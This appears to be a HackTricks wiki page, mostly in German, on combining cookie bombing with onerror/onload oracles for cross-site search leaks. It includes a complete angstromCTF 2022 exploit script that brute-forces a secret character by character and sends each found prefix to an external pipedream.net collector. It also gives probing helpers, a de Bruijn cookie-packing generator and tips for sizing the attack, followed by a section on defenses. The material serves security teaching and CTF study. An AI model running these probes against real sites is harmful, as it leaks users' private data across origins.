# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: den Browser des Opfers mit vielen/großen Cookies für die Ziel-Origin füllen, sodass nachfolgende Requests Server-/Request-Limits treffen (Größe der Request-Header, URL-Länge in Redirects usw.).
- Error-event oracle: ein cross-origin Endpoint mit einem <script> (oder einer anderen Subresource) abfragen und Zustände mit onload vs onerror unterscheiden.

High level idea
- Finde einen Ziel-Endpoint, dessen Verhalten sich in den zwei zu testenden Zuständen unterscheidet (z. B. Suche “hit” vs “miss”).
- Stelle sicher, dass der “hit”-Pfad eine lange Redirect-Kette oder eine sehr lange URL auslöst, während der “miss”-Pfad kurz bleibt. Blase die Request-Header durch viele Cookies auf, sodass nur der “hit”-Pfad die Serverlimits überschreitet und mit einem HTTP-Fehler (z. B. 431/414/400) fehlschlägt. Der Fehler kippt das onerror-Event und wird so zum Oracle für XS-Search.

When does this work
- Du kannst bewirken, dass der Browser des Opfers Cookies an das Ziel sendet (z. B. Cookies sind SameSite=None oder du kannst sie in einem First-Party-Kontext über ein Popup mittels window.open setzen).
- Es gibt eine App-Funktion, die du missbrauchen kannst, um beliebige Cookies zu setzen (z. B. „save preference“-Endpoints, die kontrollierte Eingaben in Set-Cookie umwandeln) oder um post-auth redirects zu erzeugen, die angreiferkontrollierte Daten in die URL einbetten.
- Der Server reagiert in den beiden Zuständen unterschiedlich und mit aufgeblähten Headern/URL überschreitet einer der Zustände ein Limit und liefert eine Fehlerantwort, die onerror auslöst.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large wird häufig zurückgegeben, wenn Cookies die Request-Header aufblähen; 414 URI Too Long oder ein server-spezifisches 400 kann für lange Request-Ziele zurückgegeben werden. Jede dieser Antworten führt zu einem fehlgeschlagenen Subresource-Load und löst onerror aus. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Das folgende script (aus einem öffentlichen Writeup) missbraucht eine Funktion, die es dem Angreifer erlaubt, beliebige Cookies einzufügen, und lädt dann einen cross-origin search endpoint als script. Wenn die Query korrekt ist, führt der Server einen Redirect aus, der zusammen mit dem Cookie-Bloat die Serverlimits überschreitet und einen Fehlerstatus zurückgibt, sodass script.onerror ausgelöst wird; andernfalls passiert nichts.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Why the popup (window.open)?
- Moderne Browser blockieren zunehmend third-party cookies. Das Öffnen eines Top‑Level‑Fensters zum target macht cookies first‑party, sodass Set-Cookie‑Antworten vom target haften bleiben und den cookie-bomb Schritt ermöglichen — selbst bei Einschränkungen für third‑party cookies.

2024–2025 notes on cookie availability
- Chromium-based Browser senden weiterhin häufig third‑party cookies, sofern der Nutzer oder die Site nicht opt-out, aber Safari und Firefox blockieren die meisten third‑party cookies standardmäßig. Plane für beides: (1) nutze einen first‑party cookie planting flow (window.open + auto-submit zu einem cookie-setting endpoint) und dann (2) probe mit einer subresource, die nur erfolgreich ist, wenn diese cookies gesendet werden. Wenn third‑party cookies blockiert sind, verschiebe die Probe in einen same-site Kontext (z. B. führe das oracle im Popup über ein same-site gadget aus und exfiltriere das boolean mit postMessage oder einem beacon an deinen Server).

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternative tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Fortgeschritten: de Bruijn–based cookie packing (CTF-proven)
- Wenn die App es dir erlaubt, große cookie values zu kontrollieren, kannst du guesses effizient packen, indem du jeder probe eine de Bruijn sequence anhängst. Das hält den Overhead pro probe gering und stellt sicher, dass der heavy branch nur für das richtige prefix konsequent schwerer ist. Beispielgenerator für |Σ| Symbole der Länge n (passt in einen cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idee in der Praxis: setze mehrere Cookies, deren Werte aus Präfix + deBruijn(k,n) bestehen. Nur wenn das getestete Präfix korrekt ist, wählt der Server den „schweren“ Pfad (z. B. einen zusätzlichen Redirect, der das lange Cookie oder die URL widerspiegelt), der in Kombination mit der Cookie-Aufblähung Grenzwerte überschreitet und onerror auslöst. Siehe einen öffentlichen LA CTF 2024 Solver, der diesen Ansatz verwendet.

Tipps zum Aufbau des Orakels
- Mache den “positiven” Zustand schwerer: Verkette einen zusätzlichen Redirect nur, wenn die Bedingung wahr ist, oder sorge dafür, dass die Redirect-URL unbegrenzte Benutzereingaben widerspiegelt, sodass sie mit dem geratenen Präfix wächst.
- Header aufblasen: Wiederhole das Cookie-Bombing, bis auf dem “schweren” Pfad ein konsistenter Fehler beobachtet wird. Server begrenzen üblicherweise die Header-Größe und schlagen früher fehl, wenn viele Cookies vorhanden sind.
- Stabilisieren: Starte mehrere parallele Cookie-Set-Operationen und probe wiederholt, um Timing- und Cache-Rauschen zu mitteln.
- Caches invalidieren und Pooling-Artefakte vermeiden: Füge einen zufälligen `#fragment` oder `?r=` zu Probe-URLs hinzu und verwende unterschiedliche Window-Namen bei window.open-Schleifen.
- Alternative Subressourcen: Wenn `<script>` gefiltert wird, versuche `<link rel=stylesheet>` oder `<img>`. Das onload/onerror-Boolean ist das Orakel; der Inhalt muss niemals geparst werden.

Gängige Header-/URL-Grenzen (nützliche Schwellenwerte)
- Reverse proxies/CDNs und Server setzen unterschiedliche Limits durch. Stand Oktober 2025 dokumentiert Cloudflare 128 KB insgesamt für Request-Header (und 16 KB für URLs) am Edge, weshalb du möglicherweise mehr/größere Cookies brauchst, wenn Ziele dahinter liegen. Andere Stacks (z. B. Apache über LimitRequestFieldSize) liegen oft näher bei ~8 KB pro Header-Zeile und verursachen früher Fehler. Passe die Bombengröße entsprechend an. [Cloudflare-Dokumentation zeigt das 128 KB Header-Limit.]

Related XS-Search tricks
- URL-längenbasierte Orakel (keine Cookies nötig) können kombiniert oder stattdessen verwendet werden, wenn du ein sehr langes Request-Ziel erzwingen kannst:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Mache Erfolgs- und Fehlerantworten ununterscheidbar:
- Vermeide bedingte Redirects oder große Unterschiede in der Antwortgröße zwischen Zuständen. Gib denselben Status, denselben Content-Type und ähnliche Body-Länge unabhängig vom Zustand zurück.
- Blockiere cross-site Subresource-Probes:
- SameSite-Cookies: Setze sensible Cookies auf SameSite=Lax oder Strict, damit Subresource-Requests wie <script src> sie nicht mitnehmen; bevorzuge Strict für Auth-Tokens, wenn möglich.
- Fetch Metadata: Erzwinge eine Resource Isolation Policy, um cross-site Subresource-Loads abzulehnen (z. B. wenn Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): Setze CORP: same-origin (oder mindestens same-site) für Endpunkte, die nicht als cross-origin Subresources eingebettet werden sollen.
- X-Content-Type-Options: nosniff und korrekter Content-Type auf JSON/HTML-Endpunkten, um load-as-script-Quirks zu vermeiden.
- Reduziere Header-/URL-Amplifikation:
- Begrenze Anzahl/Größe gesetzter Cookies; desinfiziere Features, die beliebige Formularfelder in Set-Cookie verwandeln.
- Normalisiere oder kürze reflektierte Daten in Redirects; vermeide das Einbetten Angreifer-kontrollierter langer Strings in Location-URLs.
- Halte Server-Limits konsistent und lasse einheitlich fehlschlagen (vermeide spezielle Fehlerseiten nur für einen Zweig).

Anmerkungen
- Diese Klasse von Angriffen wird allgemein als “Error Events” XS-Leaks diskutiert. Der Cookie-Bomb-Schritt ist nur eine bequeme Methode, um genau einen Zweig über Server-Grenzwerte zu schieben und so ein zuverlässiges boolesches Orakel zu erzeugen.

## References
- XS-Leaks: Error Events (onerror/onload als Orakel): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (häufig bei vielen Cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 Writeup-Notiz, die ein de Bruijn Cookie-Bomb-Orakel zeigt: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
